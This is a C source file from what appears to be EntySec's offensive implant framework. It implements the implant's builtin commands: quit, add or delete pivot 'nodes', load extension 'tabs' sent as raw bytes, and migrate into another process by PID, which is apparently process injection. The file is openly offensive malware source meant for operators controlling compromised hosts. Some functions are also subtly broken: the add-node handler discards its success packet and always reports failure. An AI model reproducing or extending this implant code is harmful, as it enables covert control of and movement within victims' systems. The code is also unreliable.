/*
 * MIT License
 *
 * Copyright (c) 2020-2023 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <api.h>
#include <c2.h>
#include <node.h>
#include <tab.h>
#include <migrate.h>
#include <tlv_types.h>
#include <tlv.h>

#define BUILTIN_BASE 0

#define BUILTIN_QUIT \
        TLV_TYPE_CUSTOM(TLV_TYPE_INT, \
                        BUILTIN_BASE, \
                        API_CALL_STATIC + 1)
#define BUILTIN_ADD_NODE \
        TLV_TYPE_CUSTOM(TLV_TYPE_INT, \
                        BUILTIN_BASE, \
                        API_CALL_STATIC + 2)
#define BUILTIN_DELETE_NODE \
        TLV_TYPE_CUSTOM(TLV_TYPE_INT, \
                        BUILTIN_BASE, \
                        API_CALL_STATIC + 3)
#define BUILTIN_ADD_TAB \
        TLV_TYPE_CUSTOM(TLV_TYPE_INT, \
                        BUILTIN_BASE, \
                        API_CALL_STATIC + 4)
#define BUILTIN_DELETE_TAB \
        TLV_TYPE_CUSTOM(TLV_TYPE_INT, \
                        BUILTIN_BASE, \
                        API_CALL_STATIC + 5)
#define BUILTIN_MIGRATE \
        TLV_TYPE_CUSTOM(TLV_TYPE_INT, \
                        BUILTIN_BASE, \
                        API_CALL_STATIC + 6)

static tlv_pkt_t *builtin_quit(c2_t *c2)
{
    return api_craft_tlv_pkt(API_CALL_QUIT);
}

static tlv_pkt_t *builtin_add_node(c2_t *c2)
{
    ipv4_t src_host, dst_host;
    port_t src_port, dst_port;

    tlv_pkt_get_int(c2->tlv_pkt, TLV_TYPE_NODE_SRC_ADDR, &src_host);
    tlv_pkt_get_ushort(c2->tlv_pkt, TLV_TYPE_NODE_SRC_PORT, &src_port);
    tlv_pkt_get_int(c2->tlv_pkt, TLV_TYPE_NODE_DST_ADDR, &dst_host);
    tlv_pkt_get_ushort(c2->tlv_pkt, TLV_TYPE_NODE_DST_PORT, &dst_port);

    if (node_add(&c2->dynamic.nodes, c2->dynamic.n_count, \
        src_host, src_port, dst_host, dst_port) == 0)
    {
        tlv_pkt_t *result = api_craft_tlv_pkt(API_CALL_SUCCESS);
        tlv_pkt_add_int(result, TLV_TYPE_NODE_ID, c2->dynamic.n_count);
        c2->dynamic.n_count++;
    }

    return api_craft_tlv_pkt(API_CALL_FAIL);
}

static tlv_pkt_t *builtin_delete_node(c2_t *c2)
{
    int node_id;
    tlv_pkt_get_int(c2->tlv_pkt, TLV_TYPE_NODE_ID, &node_id);

    if (node_delete(&c2->dynamic.nodes, node_id) == 0)
        return api_craft_tlv_pkt(API_CALL_SUCCESS);

    return api_craft_tlv_pkt(API_CALL_FAIL);
}

static tlv_pkt_t *builtin_add_tab(c2_t *c2)
{
    int tab_size;
    tlv_pkt_get_int(c2->tlv_pkt, TLV_TYPE_TAB_SIZE, &tab_size);

    unsigned char *tab = malloc(tab_size);

    if (tab != NULL)
    {
        if (tlv_pkt_get_bytes(c2->tlv_pkt, TLV_TYPE_TAB, tab) == 0)
        {
            if (tab_add(&c2->dynamic.tabs, c2->dynamic.t_count, tab) == 0)
            {
                tlv_pkt_t *result = api_craft_tlv_pkt(API_CALL_SUCCESS);
                tlv_pkt_add_int(result, TLV_TYPE_TAB_ID, c2->dynamic.t_count);
                c2->dynamic.t_count++;
                return result;
            }
        }
    }

    return api_craft_tlv_pkt(API_CALL_FAIL);
}

static tlv_pkt_t *builtin_delete_tab(c2_t *c2)
{
    int tab_id;
    tlv_pkt_get_int(c2->tlv_pkt, TLV_TYPE_TAB_ID, &tab_id);

    if (tab_delete(&c2->dynamic.tabs, tab_id) == 0)
        return api_craft_tlv_pkt(API_CALL_SUCCESS);

    return api_craft_tlv_pkt(API_CALL_FAIL);
}

static tlv_pkt_t *builtin_migrate(c2_t *c2)
{
    int migrate_size;
    pid_t migrate_pid;

    tlv_pkt_get_int(c2->tlv_pkt, TLV_TYPE_MIGRATE_SIZE, &migrate_size);
    tlv_pkt_get_int(c2->tlv_pkt, TLV_TYPE_MIGRATE_PID, &migrate_pid);

    unsigned char *migrate = malloc(migrate_size);

    if (migrate != NULL)
    {
        if (tlv_pkt_get_bytes(c2->tlv_pkt, TLV_TYPE_MIGRATE, migrate) == 0)
        {
            if (migrate_init(c2, migrate_pid, migrate_size, migrate) == 0)
            {
                free(migrate);
                return api_craft_tlv_pkt(API_CALL_QUIT);
            }
        }

        free(migrate);
    }

    return api_craft_tlv_pkt(API_CALL_FAIL);
}

void register_builtin_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, BUILTIN_QUIT, builtin_quit);
    api_call_register(api_calls, BUILTIN_ADD_NODE, builtin_add_node);
    api_call_register(api_calls, BUILTIN_DELETE_NODE, builtin_delete_node);
    api_call_register(api_calls, BUILTIN_ADD_TAB, builtin_add_tab);
    api_call_register(api_calls, BUILTIN_DELETE_TAB, builtin_delete_tab);
    api_call_register(api_calls, BUILTIN_MIGRATE, builtin_migrate);
}